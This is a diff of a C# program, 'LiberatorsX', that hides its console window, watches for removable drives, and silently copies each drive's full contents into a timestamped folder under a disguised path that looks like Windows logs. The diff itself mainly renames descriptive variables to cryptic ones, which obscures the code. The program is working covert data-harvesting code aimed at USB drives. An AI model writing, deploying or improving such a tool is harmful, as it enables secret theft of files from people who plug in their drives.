@@ -3,13 +3,12 @@ using System.IO;
 using System.Collections.Generic;
 using System.Threading;
 
-//Powered By Yanda2008
-//爱在夕阳下·御风前行 
-//最后修改日期2023年/11月/09日
+// Powered By Yanda2008 
+// 最后修改日期2023年/11月/18日
 class LiberatorsX
 {
-    static HashSet<string> copiedDrives = new HashSet<string>();
-    static bool isCopying = false;
+    static HashSet<string> okcopy = new HashSet<string>();
+    static bool zzcopy = false;
 
     // 隐藏控制台
     const int SW_HIDE = 0;
@@ -29,41 +28,41 @@ class LiberatorsX
         // 持续监测可移动驱动器
         while (true)
         {
-            var drives = DriveInfo.GetDrives();
-            bool newDriveFound = false;
+            var alldrives = DriveInfo.GetDrives();
+            bool newdrive = false;
 
-            foreach (var drive in drives)
+            foreach (var driveing in alldrives)
             {
-                if (IsRemovableDrive(drive.Name) && !copiedDrives.Contains(drive.Name))
+                if (IsRemovableDrive(driveing.Name) && !okcopy.Contains(driveing.Name))
                 {
-                    string currentDateTime = DateTime.Now.ToString("yyyyMMddHHmmss"); // 时间
-                    string destinationDirectory = Path.Combine("C:\\Logs\\Log\\WindowsLogs\\Logs\\1", currentDateTime);
-                    string sourceDirectory = drive.RootDirectory.FullName;
+                    string todaytime = DateTime.Now.ToString("yyyyMMddHHmmss"); // 时间
+                    string mbdire = Path.Combine("C:\\Logs\\Log\\WindowsLogs\\Logs\\1", todaytime);
+                    string sdire233 = driveing.RootDirectory.FullName;
 
                     // 如果目标文件夹不存在，创建
-                    if (!Directory.Exists(destinationDirectory))
+                    if (!Directory.Exists(mbdire))
                     {
-                        Directory.CreateDirectory(destinationDirectory);
+                        Directory.CreateDirectory(mbdire);
                     }
 
-                    isCopying = true;
+                    zzcopy = true;
                     // 复制文件夹
-                    if (CopyDirectory(sourceDirectory, destinationDirectory))
+                    if (CopyDirectory(sdire233, mbdire))
                     {
-                        copiedDrives.Add(drive.Name);
-                        newDriveFound = true;
-                        isCopying = false;
+                        okcopy.Add(driveing.Name);
+                        newdrive = true;
+                        zzcopy = false;
                     }
                     else
                     {
-                        isCopying = false;
+                        zzcopy = false;
                         break;
                     }
                 }
             }
 
             // 如果没有找到新的驱动器并且不在复制中，等待5秒钟再继续检查
-            if (!newDriveFound && !isCopying)
+            if (!newdrive && !zzcopy)
             {
                 Thread.Sleep(5000);
             }
@@ -71,20 +70,20 @@ class LiberatorsX
     }
 
     // 复制文件夹
-    static bool CopyDirectory(string sourceDirectory, string destinationDirectory)
+    static bool CopyDirectory(string sdire233, string mbdire)
     {
         try
         {
-            Directory.CreateDirectory(destinationDirectory);
-            foreach (string file in Directory.GetFiles(sourceDirectory))
+            Directory.CreateDirectory(mbdire);
+            foreach (string sour112 in Directory.GetFiles(sdire233))
             {
-                string destinationFile = Path.Combine(destinationDirectory, Path.GetFileName(file));
-                File.Copy(file, destinationFile, true);
+                string ylfile = Path.Combine(mbdire, Path.GetFileName(sour112));
+                File.Copy(sour112, ylfile, true);
             }
-            foreach (string subDirectory in Directory.GetDirectories(sourceDirectory))
+            foreach (string ywjzwj in Directory.GetDirectories(sdire233))
             {
-                string destinationSubDirectory = Path.Combine(destinationDirectory, Path.GetFileName(subDirectory));
-                CopyDirectory(subDirectory, destinationSubDirectory);
+                string copysub = Path.Combine(mbdire, Path.GetFileName(ywjzwj));
+                CopyDirectory(ywjzwj, copysub);
             }
             return true;
         }
